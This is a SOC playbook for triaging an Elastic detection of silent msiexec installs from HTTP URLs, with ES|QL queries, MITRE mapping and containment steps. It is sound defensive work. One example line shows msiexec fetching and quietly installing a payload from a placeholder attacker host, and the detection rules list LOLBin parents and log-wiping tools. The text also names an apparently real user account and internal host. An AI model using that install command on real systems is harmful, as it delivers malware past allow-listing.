# Potential Remote Install via MsiExec [NBI-4688] — SOC Investigation Playbook

**Rule ID:** `nbi-b2-potential-remote-install-via-msiexec` · **Type:** eql · **Language:** eql · **Severity:** high · **Risk:** 73 · **Platform:** Elastic Security (NBI)
**Primary index (live):** `logs-system.security*` (Windows Security Event 4688) · **Alert entities:** `$host`, `$user`, `$parent`, `$source_ip`

> Substitute the alert's real values for the `$vars` before running any query. This playbook was authored and live-validated against NBI telemetry with `$host = nim-jump-apv02`, `$user = MUSTAFA.KAREEM`, `$parent = explorer.exe`, `$source_ip = 10.11.102.15` (a real jump host, a real interactive user, a real launching parent on that host, and the shared VDI egress that fronts it). Every ES|QL block below executed successfully against the live NBI cluster within a 4-hour window. **Note:** `msiexec.exe` remote installs were absent from the validated window (the deployed rule is low-volume by design), so the confirm queries execute and return no in-window match — an empty result is **not** proof of safety (see §8, §14).

---

## 1. Purpose

This playbook drives triage and investigation of the **Potential Remote Install via MsiExec** detection on NBI's Elastic Security deployment. The rule fires when `msiexec.exe` is invoked to **install** (`/i` or `-i`) from an **HTTP(S) URL**, **quietly** (`/qn`, `-qn`, `/q`, `-q`, `/quiet`), launched by a **shell/scripting/LOLBin parent** (`sihost`, `explorer`, `cmd`, `wscript`, `mshta`, `powershell`, `wmiprvse`, `pcalua`, `forfiles`, `conhost`) — while **excluding** a curated set of known-legitimate remote-install URLs (NinjaRMM, Zoom, AWS CLI, and specific enterprise config switches). In short: **a silent MSI install pulled from a URL that is not on the approved list.**

`msiexec.exe` is a signed, trusted Windows installer, which makes `msiexec /i http://.../x.msi /qn` a favourite **signed-binary proxy-execution** and **ingress** technique — the attacker delivers and runs a payload as a quiet install, past application allow-listing, from a remote server. Legitimate silent remote installs also happen (RMM tools, enterprise deployment), which is why the rule already excludes known-good URLs. The analyst decides whether this installed an attacker package (**true_positive**), an authorised-but-unlisted legitimate deployment or a proven-failed install (**false_positive**), an unbaselined internal deployment source (**misconfiguration**), or an event whose URL/payload cannot be resolved (**needs_escalation**). The URL, the launching parent, and what the install executed decide it.

## 2. Detection Summary

The deployed rule is an **EQL** rule. Reconstructed from the deployed trigger logic, the detection is:

```eql
process where host.os.type == "windows" and event.type == "start" and
  process.name : "msiexec.exe" and
  process.args : "*http*" and
  process.args : ("/i", "-i", "/package") and
  process.args : ("/qn", "-qn", "/q", "-q", "/quiet") and
  process.parent.name : ("sihost.exe", "explorer.exe", "cmd.exe", "wscript.exe", "mshta.exe",
                         "powershell.exe", "wmiprvse.exe", "pcalua.exe", "forfiles.exe", "conhost.exe") and
  not process.command_line : ("*ninjarmm*", "*zoom*", "*awscli*")
```

Plain English: a quiet `msiexec` **install from an HTTP(S) URL**, launched by an interactive shell / script host / LOLBin, whose URL is **not** on the approved exclusion list. The remote fetch (`*http*`) plus the quiet flags (`/qn` etc.) plus a scripted parent is the proxy-install shape.

One-line Kibana KQL detection filter (for fast pivoting in Discover / Timeline):

```kql
event.code : "4688" and process.name : "msiexec.exe" and process.args : *http* and process.args : (\/qn or \/q or -q) and process.args : (\/i or -i)
```

The **MSI download and its source are not in 4688** — the URL comes from the command line/args; corroborate the fetch via proxy/DNS/FortiGate (§8, §15.8).

## 3. Alert Meaning

An alert means: **on `$host`, `$user` ran `msiexec.exe` to silently install an MSI from an HTTP(S) URL that is not on the approved list, launched by `$parent`.** It does not, by itself, prove the package was malicious — legitimate but unlisted deployments exist. The consequential questions:

1. **What is the URL?** A raw IP, a non-corporate/newly-seen domain, a high port, or a random MSI name is attacker delivery; a recognised vendor/internal deployment URL (even if unlisted) may be authorised. The rule already carves out NinjaRMM/Zoom/AWS, so a hit is a URL **outside** those — verify the destination rather than assume.
2. **What is the parent (`$parent`)?** A management/deployment context (an RMM agent, an approved deployment tool) leans authorised; a **script host** (`wscript`/`mshta`/`powershell`), `forfiles`, `pcalua`, or `wmiprvse` — especially alongside other LOLBins or encoded PowerShell — leans malicious proxy execution; an Office/browser ancestor points to phishing-driven delivery.
3. **What did the install execute?** A custom-action child of `msiexec` (a script host, a dropped `.exe` from Temp/AppData) or a new binary from a non-standard path shortly after is a payload that ran; a quiet install that only lays down files in Program Files with no odd child is closer to a legitimate deployment.

Because `process.command_line` is ~50% populated on NBI (§8), the URL and flags are read from `process.args` when the command line is empty, and an **empty payload is not proof of benign use**.

## 4. Typical Attacker Behavior

This sits at **Defense Evasion** (signed-binary proxy execution) with **Ingress Tool Transfer**. A typical sequence:

1. The attacker has code execution (phishing payload, macro, a foothold on a shared host) under a shell/script host.
2. They run `msiexec /i http://<attacker-host>/payload.msi /qn` (or `/quiet`). `msiexec` — signed and trusted — fetches the remote MSI and installs it silently, past allow-listing that would block an unknown `.exe`.
3. The MSI executes its payload via an **InstallExecuteSequence custom action** — often a script host or a dropped binary — installing a RAT, loader, or ransomware while appearing to be an ordinary installer.
4. Follow-on: persistence (service `7045`, scheduled task `4698`, Run key), credential access, or lateral movement under the launching account.

Tradecraft to expect around the alert: a **URL to a raw IP / newly-seen domain / high port**; a **script-host or LOLBin parent** (`wscript`/`mshta`/`powershell`/`forfiles`/`pcalua`/`wmiprvse`); a **custom-action child** of `msiexec` (a script host or a dropped `.exe` from `Temp`/`AppData`); and a new binary running from a non-standard path shortly after the install. Attackers may also mimic an approved/excluded URL, stage the MSI locally first (no `http` on the command line), or use an MSI transform/patch — see §5/§23.

## 5. Common False Positives

- **RMM and enterprise deployment tools** performing legitimate silent remote installs from URLs **not** on the exclusion list (the exclusion list is not exhaustive).
- **Internal software-deployment servers** that push MSIs over HTTP(S) as packaged behaviour, under a management parent.
- **Vendor installers** that chain a remote MSI during setup, under `explorer.exe` (a user double-clicking an installer) or a deployment agent.
- **Failed installs** — an unreachable URL or MSI error where nothing was installed or run — which are recorded as a **proven-failed** attempt (a blocked attempt), **never "benign"**.

None are "benign" by default — each requires the **URL destination and the deploying context to be confirmed** (not assumed) before classifying false_positive (authorised).

## 6. Environment-Specific False Positives (NBI)

Validated against NBI's live `logs-system.security*`:

- **`msiexec.exe` remote installs are rare in this estate.** In the validated 4-hour window, **no** `msiexec.exe` executions were present on the 4688 stream at all. There is therefore no in-window baseline of legitimate remote installs to tune out — a real hit is a notable, per-URL-verified event.
- **The launching parent matters more than volume here.** On the jump/VDI tier, `explorer.exe` and `svchost`/`services` are common parents; a **script-host or LOLBin** parent (`wscript`/`mshta`/`powershell`/`forfiles`/`pcalua`) driving `msiexec` from a URL is the intrusion shape and outranks an `explorer`-launched vendor installer.
- **The download source is invisible on-cluster.** NBI has no process-to-network (`5156`) telemetry, so the MSI fetch and its server are not in `logs-system.security*` — the URL is read from the command line/args and corroborated via FortiGate/proxy (§15.8).
- **Command-line capture is bimodal (§8).** The URL and flags may be present only in `process.args`, or absent, on the command-line-less tier — fold `command_line` + `MV_CONCAT(process.args," ")` and escalate for proxy logs where both are null.
- **No standing allow-list beyond the rule's own exclusions.** Do not add a URL to the approved list off one alert; confirm the deployment first, then add the exact URL.

## 7. Investigation Prerequisites

- Access to NBI Elastic Security (Discover, Timeline, Alerts) and the `_query` ES|QL API, **read-only**.
- The alert's entity values: `host.name` (`$host`), the acting `user.name` (`$user`), the launching `process.parent.name` (`$parent`), and — if the session is remote — the logon `source.ip` (`$source_ip`).
- **The full `msiexec` command line / args** (the MSI URL and flags) — from the event where audited, or from proxy logs; and, ideally, **proxy/DNS/FortiGate** visibility of the download for corroboration.
- Awareness of NBI's telemetry reality (§8): **Windows Security 4688 only, no Sysmon, no Elastic Defend/EDR, no process-to-network events, and host-dependent command-line capture.** The MSI download/source is **not** collectable on NBI and is marked `N/A` in §15 with the honest substitute.
- A tight incident window: every query uses `@timestamp >= NOW() - 4 hours`.

## 8. Required Data Sources

**Live and used by this playbook:**

- **`logs-system.security*`** — Windows Security Event Log; Event **4688** (process creation) is the anchor. Supporting events used in pivots: **4624/4625/4634/4647** (logon/logoff), **4672** (special privileges), **4648** (explicit-credential), **4768/4769** (Kerberos), **5140/5145** (share access), **7045** (service install), **4698** (scheduled task), **4720** (account created), **1102** (audit log cleared).

**Field population on 4688 (measured live on NBI):**

| Field | Population | Note |
|---|---|---|
| `process.name`, `process.executable` | ~100% | `msiexec.exe` is matched here; child image path is the payload artifact. |
| `process.parent.name`, `process.parent.executable` | ~99.7% | `$parent` — the reliable launcher discriminator. |
| `process.pid`, `process.parent.pid` | ~100% | PID-based lineage (no Sysmon `process.entity_id`). |
| `user.name`, `user.domain` | ~100% | Acting account. |
| `process.command_line` | **host-dependent (~50%)** | **Bimodal.** Carries the MSI URL + flags where audited; null on much of the estate. |
| `process.args` (multivalued) | tracks `command_line` | The URL/flags are often here — fold with `MV_CONCAT(process.args, " ")`. |

**Declared by the estate but DEAD in NBI (0 docs — never query):** `winlogbeat-*`, `logs-windows.forwarded*`, `logs-windows.sysmon_operational-*`, `endgame-*`, `logs-endpoint.events.*`, `logs-crowdstrike.fdr*`, `logs-sentinel_one_cloud_funnel.*`.

**Telemetry-blocked signals for this technique (state plainly):** there is **no process-to-network telemetry** on NBI (no Sysmon `5156`), so the **MSI download and its source server cannot be seen** in `logs-system.security*` — the URL is read from the command line/args and corroborated via `logs-fortinet_fortigate.log-*` / proxy. There are **no process hashes** (`process.hash.*` absent on 4688). And because `msiexec` was absent in-window, the confirm queries return no match — **empty result ≠ safe**; the rule fires on a real execution.

## 9. MITRE ATT&CK Mapping

From the rule's `threat[]`:

- **Tactic: Defense Evasion (TA0005)** — https://attack.mitre.org/tactics/TA0005/
- **Technique: T1218 — System Binary Proxy Execution**, sub-technique **T1218.007 — Msiexec** — https://attack.mitre.org/techniques/T1218/007/
- **Technique: T1105 — Ingress Tool Transfer** (the remote MSI fetch delivers the payload) — https://attack.mitre.org/techniques/T1105/

The behaviour uses a signed system binary (`msiexec`) to both **transfer** a remote payload and **execute** it while evading allow-listing — proxy execution plus ingress in one step.

## 10. Severity Guidance

Deployed severity is **high** (risk 73). Adjust the *effective* incident priority using NBI-specific context:

- **Raise toward critical** when: the URL is a **raw IP / newly-seen domain / high port / random MSI name**; the parent is a **script host or LOLBin** (`wscript`/`mshta`/`powershell`/`forfiles`/`pcalua`/`wmiprvse`) or an Office/browser ancestor; a **custom-action child** of `msiexec` or a **dropped binary from a non-standard path** executes (§15.10, §14 payload); the host is a **server/Tier-0** system; or follow-on persistence/credential activity appears.
- **Keep at high** for a confirmed remote silent install from an unlisted URL with no authorised explanation, even when the command line is null.
- **Lower only** to **false_positive (authorised)** when the URL is a **verified** legitimate deployment/RMM source run by a management context, or the install is **proven failed** (URL unreachable / MSI error, nothing installed or run) — documented, not assumed.

## 11. Triage Process (Tier 1)

Target: reach a hold/confirm/escalate decision in ~15 minutes.

1. **Read the alert entities.** Note `$host`, `$user`, `$parent`, the timestamp, and (where audited) the MSI URL + flags in `process.command_line`/`process.args`.
2. **Read the URL** (§14). Recognised vendor/internal deployment source vs raw IP / newly-seen domain / high port / random MSI name.
3. **Characterise the parent** (`$parent`, §15.2). Management/deployment context vs script host / LOLBin / Office-browser ancestor.
4. **Check what the install executed** (§15.3): a custom-action child of `msiexec` or a dropped binary from a non-standard path shortly after is a payload that ran.
5. **Decide:** suspicious URL + scripted parent + payload → escalate to Tier 2 as **true_positive** candidate; verified deployment/RMM URL + management parent, or proven-failed install → **false_positive**; URL/payload unresolvable → **needs_escalation**. Never close as benign without reading the URL.

## 12. Investigation Workflow (Tier 2 / Tier 3)

1. **Confirm the remote install and its URL** (§14). The URL is the primary classification signal; where the command line is null, pull proxy/FortiGate logs for the fetch.
2. **Characterise the launching parent** (§15.2, §15.3) — management/deployment vs scripted LOLBin.
3. **Determine what the install executed** (§15.3, §15.10) — custom-action children and new binaries from non-standard paths.
4. **Scope the account and host** (§15.4, §15.5) and bound the session (§15.6, §15.12).
5. **Validate the attack chain** (§17): persistence (§17.2), privilege escalation (§17.3), defence evasion (§17.4), lateral movement (§17.1), impact (§17.5).
6. **Build the timeline** (§16): parent → `msiexec` remote install → payload → follow-on.
7. **Escalate to Tier 3 / IR** if a suspicious URL with an executing payload is confirmed (see §21).

## 13. Decision Tree

```
Alert: msiexec.exe silently installed from an unlisted HTTP(S) URL on $host by $user via $parent (§14)
│
├─ Anchor not reproducible / process is not msiexec.exe / no remote install in the command line
│     → re-open in Discover; if truly absent → needs_escalation (data-quality / pull proxy logs)
│
├─ Anchor confirmed → read URL + parent + payload
│   │
│   ├─ URL is a VERIFIED legitimate deployment/RMM source, run by a management context
│   │     → false_positive (authorised deployment) — document; add the exact URL to the approved list
│   │
│   ├─ Install POSITIVELY failed (URL unreachable / MSI error, nothing installed or run)
│   │     → false_positive (proven-failed install — never "benign") — document, still check for follow-on
│   │
│   ├─ A legitimate internal deployment tool installs from a URL merely not on the exclusion list, no payload
│   │     → misconfiguration — add the URL to the approved remote-install list
│   │
│   └─ Suspicious/unrecognised URL AND (scripted LOLBin parent  OR  msiexec custom-action child / dropped
│       binary from a non-standard path executing)
│         → true_positive — proceed to Containment (§18); escalate per §21
│
└─ URL or whether a payload executed cannot be established from 4688 alone
      → needs_escalation — pull the full msiexec command + proxy logs; hand to Tier 3/IR
```

## 14. Validation Queries

### 14.1 Reproduce the rule estate-wide (confirm the detection logic)

Pre-filtered on `msiexec.exe` before the wildcard match — safe. Folds `process.command_line` and the multivalued `process.args`. In NBI this is **normally 0** in-window (no `msiexec` remote installs observed); any hit is immediately notable.

```esql
FROM logs-system.security*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND TO_LOWER(process.name) == "msiexec.exe"
| EVAL cl = TO_LOWER(COALESCE(process.command_line, MV_CONCAT(process.args, " ")))
| WHERE cl LIKE "*http*" AND (cl LIKE "*/i*" OR cl LIKE "*-i*") AND (cl LIKE "*/q*" OR cl LIKE "*-q*")
| KEEP @timestamp, host.name, user.name, process.parent.name, process.command_line
| SORT @timestamp DESC
| LIMIT 100
```

### 14.2 Confirm the remote install and its URL on the alert host — reused from the deployed playbook

Scopes to `$host` and returns the URL, quiet flags, and parent. An empty result means no remote silent MSI install on `$host` in 4h — **not** proof of safety (command line ~50% populated; the rule fires on a real execution).

```esql
FROM logs-system.security*
| WHERE event.code == "4688" AND host.name == "$host" AND TO_LOWER(process.name) == "msiexec.exe" AND @timestamp >= NOW() - 4 hours
| EVAL cl = TO_LOWER(COALESCE(process.command_line, MV_CONCAT(process.args, " ")))
| WHERE cl LIKE "*http*" AND (cl LIKE "*/i*" OR cl LIKE "*-i*") AND (cl LIKE "*/q*" OR cl LIKE "*-q*")
| KEEP @timestamp, user.name, process.parent.name, process.command_line, process.args
| SORT @timestamp DESC
| LIMIT 20
```

## 15. Investigation Queries — Entity Pivots

### 15.1 Entity pivoting

Anchor on the alert's entity: retrieve `msiexec.exe` executions on `$host` (keyed to `$user` where relevant) with the full field set, so the URL, parent, pid, and account are confirmed from real data. In NBI this is normally empty in-window (no `msiexec` remote installs observed) — an empty anchor is the honest baseline, not exoneration; the rule fired on a real execution.

```esql
FROM logs-system.security*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
    AND TO_LOWER(process.name) == "msiexec.exe"
| KEEP @timestamp, host.name, user.name, user.domain, process.command_line, process.parent.name, process.pid, process.parent.pid
| SORT @timestamp DESC
| LIMIT 50
```

### 15.2 Process investigation

**15.2a — Characterise the launching parent `$parent`.** Reused from the deployed playbook: what else `$parent` spawned on `$host` — a management/deployment parent doing coherent installs leans authorised; a script host / LOLBin launching `msiexec` alongside other suspicious children leans malicious proxy execution.

```esql
FROM logs-system.security*
| WHERE event.code == "4688" AND host.name == "$host" AND process.parent.name == "$parent" AND @timestamp >= NOW() - 4 hours
| STATS spawned = COUNT(*), users = COUNT_DISTINCT(user.name), distinct_children = COUNT_DISTINCT(process.name) BY process.name
| SORT spawned DESC
| LIMIT 20
```

**15.2b — Estate prevalence of `msiexec` and its parents.** Pre-filtered on `msiexec.exe`. Shows which parents drive `msiexec` across the estate — a scripted/LOLBin parent is anomalous against the usual `services`/`svchost`/`explorer` installers. Normally empty in-window on NBI.

```esql
FROM logs-system.security*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND TO_LOWER(process.name) == "msiexec.exe"
| STATS execs = COUNT(*), hosts = COUNT_DISTINCT(host.name), users = COUNT_DISTINCT(user.name) BY process.parent.name
| SORT execs DESC
| LIMIT 25
```

### 15.3 Parent-Child process analysis

**15.3a — The `msiexec` lineage on the host.** Both directions: what launched `msiexec.exe` (the `$parent`/grandparent) and what `msiexec.exe` spawned (custom-action children — the payload). This is the rule-specific tree; normally empty in-window on NBI.

```esql
FROM logs-system.security*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
    AND (TO_LOWER(process.parent.name) == "msiexec.exe" OR TO_LOWER(process.name) == "msiexec.exe")
| KEEP @timestamp, user.name, process.parent.name, process.parent.pid, process.name, process.pid, process.executable
| SORT @timestamp DESC
| LIMIT 50
```

**15.3b — What the install executed (custom-action children and non-standard-path binaries).** Reused from the deployed playbook: surfaces `msiexec` children and any process running from a non-standard path for `$user` on `$host` — the payload the install laid down and ran.

```esql
FROM logs-system.security*
| WHERE event.code == "4688" AND host.name == "$host" AND user.name == "$user" AND @timestamp >= NOW() - 4 hours
| EVAL exe = TO_LOWER(process.executable)
| WHERE TO_LOWER(process.parent.name) == "msiexec.exe" OR (NOT exe LIKE "*system32*" AND NOT exe LIKE "*syswow64*" AND NOT exe LIKE "*program files*" AND NOT exe LIKE "*windows*")
| STATS execs = COUNT(*), first_seen = MIN(@timestamp), last_seen = MAX(@timestamp) BY process.name, process.executable, process.parent.name
| SORT execs DESC
| LIMIT 25
```

### 15.4 User investigation

Where has `$user` executed processes in the window, and how broad is their footprint? A normally host-bound account suddenly spanning multiple hosts, or driving installs it does not normally perform, is suspicious.

```esql
FROM logs-system.security*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND user.name == "$user"
| STATS executions = COUNT(*), distinct_procs = COUNT_DISTINCT(process.name) BY host.name
| SORT executions DESC
| LIMIT 20
```

### 15.5 Host investigation

Baseline the host by surfacing its **rarest** process/parent pairs first — a scripted `msiexec` remote install stands out against routine session churn.

```esql
FROM logs-system.security*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
| STATS executions = COUNT(*), users = COUNT_DISTINCT(user.name) BY process.name, process.parent.name
| SORT executions ASC
| LIMIT 40
```

### 15.6 IP investigation

**15.6a — Where did `$user` log in from on `$host`.** `source.ip` is present on network (type 3) and RemoteInteractive/RDP (type 10) logons; null on local interactive (type 2). For a jump/VDI host this reveals the operator's origin. (This is the operator's *inbound* IP, not the MSI's *download* source — see §15.8.)

```esql
FROM logs-system.security*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4624"
    AND host.name == "$host" AND user.name == "$user"
    AND source.ip IS NOT NULL
| STATS logons = COUNT(*) BY source.ip, winlog.event_data.LogonType
| SORT logons DESC
| LIMIT 20
```

**15.6b — Reverse pivot on the source IP.** Who else authenticated from `$source_ip`? In NBI this frequently returns *shared* admin/VDI infrastructure (one egress IP fronting many users), so treat `source.ip` as a weak individual identifier and correlate IP + user + host.

```esql
FROM logs-system.security*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4624"
    AND source.ip == "$source_ip"
| STATS logons = COUNT(*) BY user.name, host.name, winlog.event_data.LogonType
| SORT logons DESC
| LIMIT 25
```

### 15.7 Domain investigation

N/A — DNS/network-domain telemetry is not collected for NBI Windows hosts (no Sysmon, no Elastic Defend network/DNS events); Windows Security 4688 carries no domain-contacted field. The MSI's host/domain is inside the command-line URL, not a resolved-domain event. Alternative: extract the host from the `msiexec` URL (§14) and resolve/pivot it in `logs-fortinet_fortigate.log-*` by the host's IP.

### 15.8 URL investigation

N/A on-cluster — **the MSI URL is the primary signal but is not in any web-telemetry index on NBI.** It is carried in `process.command_line`/`process.args` (recovered in §14), *not* in a proxy/DNS index tied to `$host` (no process-to-network events). Alternative: read the URL from the command line/args, then corroborate the actual download against perimeter egress in `logs-fortinet_fortigate.log-*` / FortiWeb (`logs-tcp.generic-*`) by the host's IP and the incident time. A raw IP, newly-seen domain, high port, or random MSI name in the URL is high-signal.

### 15.9 Hash investigation

N/A — process hashes are not collected. `process.hash.*` does not exist on 4688 (no Sysmon/EDR on NBI), so the MSI/payload cannot be reputation-checked from telemetry. Alternative: obtain the SHA-256 of the downloaded MSI and any dropped binary (§15.3b/§15.10) from `$host` during response with `Get-FileHash`; check VirusTotal/Talos out of band.

### 15.10 File investigation

Enumerate the distinct **non-standard-path executables** for `$user` on `$host` — the dropped payload or custom-action binary an attacker MSI lays down runs from `Users\`, `Temp`, `ProgramData`, or `AppData`, not System32/Program Files. A first-seen image in a user-writable path shortly after the install is decisive.

```esql
FROM logs-system.security*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
    AND user.name == "$user"
| EVAL exe = TO_LOWER(process.executable)
| WHERE NOT exe LIKE "*system32*" AND NOT exe LIKE "*syswow64*" AND NOT exe LIKE "*program files*" AND NOT exe LIKE "*windows*"
| STATS execs = COUNT(*), first_seen = MIN(@timestamp), last_seen = MAX(@timestamp) BY process.executable, process.parent.name
| SORT execs DESC
| LIMIT 30
```

### 15.11 Email investigation

N/A — no live email/message index in NBI (`logs-m365_defender.*` carries alerts only, not mail items). Alternative: if the `msiexec` foothold traces to phishing (an Office/browser ancestor of `$parent`), pivot the mail-security stack out of band using `$user` as the recipient and the incident timeframe.

### 15.12 Authentication investigation

Reconstruct `$user`'s logon/logoff activity on `$host` to bound the session in which the remote install ran and to spot anomalies (e.g. a network/service logon type where an interactive one is expected).

```esql
FROM logs-system.security*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code IN ("4624", "4625", "4634", "4647")
    AND host.name == "$host" AND user.name == "$user"
| STATS events = COUNT(*), first_seen = MIN(@timestamp), last_seen = MAX(@timestamp) BY event.code, winlog.event_data.LogonType, source.ip
| SORT events DESC
| LIMIT 30
```

## 16. Timeline Reconstruction

Build a time-ordered process-creation stream for `$user` on `$host` so the sequence **`$parent` → `msiexec` remote install → custom-action payload → follow-on** is explicit. Because `process.pid`/`process.parent.pid` are ~100% populated, the parent chain is legible directly; anchor on the alert timestamp and read outward.

```esql
FROM logs-system.security*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
    AND user.name == "$user"
| KEEP @timestamp, process.parent.name, process.parent.pid, process.name, process.pid, process.executable, process.command_line
| SORT @timestamp ASC
| LIMIT 200
```

For a broader host timeline (all users), drop the `user.name` predicate. Where the host lacks command-line auditing, the parent chain and non-standard-path child images carry the narrative; the URL and download come from proxy/FortiGate.

## 17. Attack-Chain Validation

### 17.1 Lateral movement validation

Did `$user` authenticate or reach shares on hosts **other than** `$host` in the window? A remote-installed payload commonly moves next; network/explicit-credential logons and Kerberos ticketing to new systems are the signal.

```esql
FROM logs-system.security*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code IN ("4624", "4648", "4768", "4769", "5140")
    AND user.name == "$user"
    AND host.name != "$host"
| STATS events = COUNT(*) BY host.name, event.code, winlog.event_data.LogonType
| SORT events DESC
| LIMIT 30
```

### 17.2 Persistence validation

Look for persistence primitives on `$host` in the window — service installs (`7045`), scheduled tasks (`4698`), account creation (`4720`), and 4688 executions of `schtasks.exe`/`reg.exe`/`sc.exe`/script hosts an installed payload would use.

```esql
FROM logs-system.security*
| WHERE @timestamp >= NOW() - 4 hours
    AND host.name == "$host"
    AND (
        (event.code == "4688" AND TO_LOWER(process.name) IN ("schtasks.exe", "reg.exe", "sc.exe", "at.exe", "powershell.exe", "wscript.exe", "cscript.exe", "rundll32.exe", "mshta.exe"))
        OR event.code == "7045"
        OR event.code == "4720"
        OR event.code == "4698"
    )
| STATS events = COUNT(*) BY event.code, process.name, user.name
| SORT events DESC
| LIMIT 40
```

### 17.3 Privilege escalation validation

Enumerate which accounts received **special (admin-equivalent) privileges** on `$host` via Event 4672, and compare against `$user`. A silent MSI install run in an elevated context, or an escalation following the install, raises priority.

```esql
FROM logs-system.security*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4672"
    AND host.name == "$host"
| STATS special_priv_logons = COUNT(*) BY user.name
| SORT special_priv_logons DESC
| LIMIT 25
```

### 17.4 Defense evasion validation

Beyond the proxy-execution itself (§9), check for evidence-destruction / defence-tampering on `$host`: event-log clearing (`1102`), audit-policy change (`4719`), and 4688 executions of `wevtutil.exe`/`fsutil.exe`/`vssadmin.exe`/`wmic.exe`/`cipher.exe`.

```esql
FROM logs-system.security*
| WHERE @timestamp >= NOW() - 4 hours
    AND host.name == "$host"
    AND (
        (event.code == "4688" AND TO_LOWER(process.name) IN ("wevtutil.exe", "fsutil.exe", "vssadmin.exe", "wmic.exe", "cipher.exe", "sdelete.exe", "sdelete64.exe"))
        OR event.code == "1102"
        OR event.code == "4719"
    )
| STATS events = COUNT(*) BY event.code, process.name, user.name
| SORT events DESC
| LIMIT 30
```

### 17.5 Impact assessment

Quantify what the install actually did by enumerating everything spawned under `msiexec` on `$host`, plus any non-standard-path binary that ran in the window. A quiet install that laid down files with no odd child is a different incident from one whose custom action executed a script host or dropped a RAT.

```esql
FROM logs-system.security*
| WHERE @timestamp >= NOW() - 4 hours
    AND host.name == "$host"
    AND event.code == "4688"
    AND TO_LOWER(process.parent.name) == "msiexec.exe"
| STATS children = COUNT(*), distinct_children = COUNT_DISTINCT(process.name) BY process.name, process.executable, user.name
| SORT children DESC
| LIMIT 30
```

## 18. Containment

- **Isolate `$host`** (network-contain / quarantine) if a true_positive is confirmed, to stop the payload and sever any C2. On a shared jump/VDI host, coordinate with IT but prioritise containment.
- **Block the MSI URL / source host** at the proxy/firewall (from §14/§15.8) to stop re-download.
- **Terminate the `msiexec` custom-action tree and any dropped binary** (§15.3b/§17.5) if the host cannot yet be isolated.
- **Suspend or force-logoff `$user`'s session** and **disable the account** if implicated; reset its credentials (§20).
- **Preserve volatile evidence first** — the downloaded MSI, any dropped payload, and the running process list — before remediation.
- Deploy/confirm changes only via the authorised human-approved DEPLOY path; investigation itself is read-only.

## 19. Eradication

- **Remove the installed product and its persistence** (§17.2) — uninstall the malicious MSI, delete services/scheduled tasks/Run keys, and remove any dropped payload identified via §15.10 (`process.executable` path).
- **Capture and analyse the MSI/payload** (hash, custom actions) for scoping and IOC extraction; block the source at the proxy.
- **Run a full anti-malware / EDR scan** on `$host` and hunt for the same MSI/URL/payload across peers, especially every host `$user` touched (§15.4, §17.1).
- **Remediate the initial-access vector** that provided the foothold from which `msiexec` was driven.

## 20. Recovery

- **Reset `$user`'s password** and any credentials accessible from `$host` during the install window; if privileged accounts logged on there (§17.3), rotate those too.
- **Restore `$host`** from a known-good image if the payload executed or persistence was extensive; otherwise validate eradication holds after reboot.
- **Return the host/account to service** only after §22 closing criteria are met and monitoring confirms no re-download from the source.
- Recommend hardening (§23): restrict `msiexec` remote installs by policy (allow only approved deployment sources), tighten egress, and keep the approved remote-install URL list current so legitimate deployments are distinguishable.

## 21. Escalation Criteria

Escalate to Tier 3 / Incident Response (and notify the customer) when **any** of the following hold:

- The MSI URL is **suspicious/unrecognised** (raw IP, newly-seen domain, high port, random MSI name).
- The launching parent (`$parent`) is a **script host / LOLBin** (`wscript`/`mshta`/`powershell`/`forfiles`/`pcalua`/`wmiprvse`) or an Office/browser ancestor.
- A **payload executed** — an `msiexec` custom-action child or a dropped binary from a non-standard path (§15.3b, §15.10, §17.5) — or persistence was installed (§17.2).
- The install ran on a **server/Tier-0** host, lateral movement follows (§17.1), or defence-tampering appears (§17.4).
- The URL or whether a payload executed cannot be established from 4688 and the alert cannot be safely cleared — escalate as **needs_escalation** and pull proxy logs.

## 22. Closing Criteria

- **false_positive (authorised):** the URL is a **verified** legitimate deployment/RMM source run by a management context; document and **add the exact URL** to the approved remote-install list.
- **false_positive (proven-failed):** the install positively failed (URL unreachable / MSI error, nothing installed or run) — recorded as a blocked attempt, **never "benign"**; still check for follow-on.
- **misconfiguration:** a legitimate internal deployment tool installs from a URL merely not on the exclusion list, with no payload behaviour; add the URL to the approved list.
- **true_positive:** an attacker-controlled MSI was installed and executed a payload via signed-binary proxy execution; containment/eradication/recovery completed, source blocked, scope established, no residual persistence.
- **needs_escalation:** handed to Tier 3/IR with the URL/payload gaps documented.

In all cases: attach the ES|QL used and its results, the entity values (`$host`/`$user`/`$parent`), the MSI URL, and whether a payload executed, before closing.

## 23. Analyst Notes

- **The URL decides it, and it lives in the command line.** There is no web-telemetry index on NBI — read the URL from `process.command_line`/`process.args` (§14) and corroborate the download in FortiGate/proxy (§15.8). A raw IP / newly-seen domain / high port / random MSI name is the tell; a verified vendor/internal source is authorised.
- **The parent (`$parent`) ranks the case.** A management/deployment parent leans authorised; a **script host or LOLBin** (`wscript`/`mshta`/`powershell`/`forfiles`/`pcalua`/`wmiprvse`) driving `msiexec` from a URL is the proxy-install shape.
- **Look for the payload, not just the install.** `msiexec` custom-action children and non-standard-path binaries (§15.3b/§15.10/§17.5) separate an executed payload (TP) from a benign file-drop deployment.
- **Absence is not safety here.** `msiexec` remote installs were absent from the validated window, so the confirm queries return no in-window match — the rule fires on a real execution, and the download/source is invisible on-cluster regardless.
- **Command-line capture is bimodal.** The URL/flags may be in `process.args` only, or absent, on the command-line-less tier — fold `command_line` + `MV_CONCAT(process.args," ")` and escalate for proxy logs where both are null.
- **`source.ip` is shared infrastructure.** A single VDI/jump egress IP (validated example: `10.11.102.15`) fronts many users; it shows the operator's inbound origin, not the MSI's download source. Correlate IP + user + host.
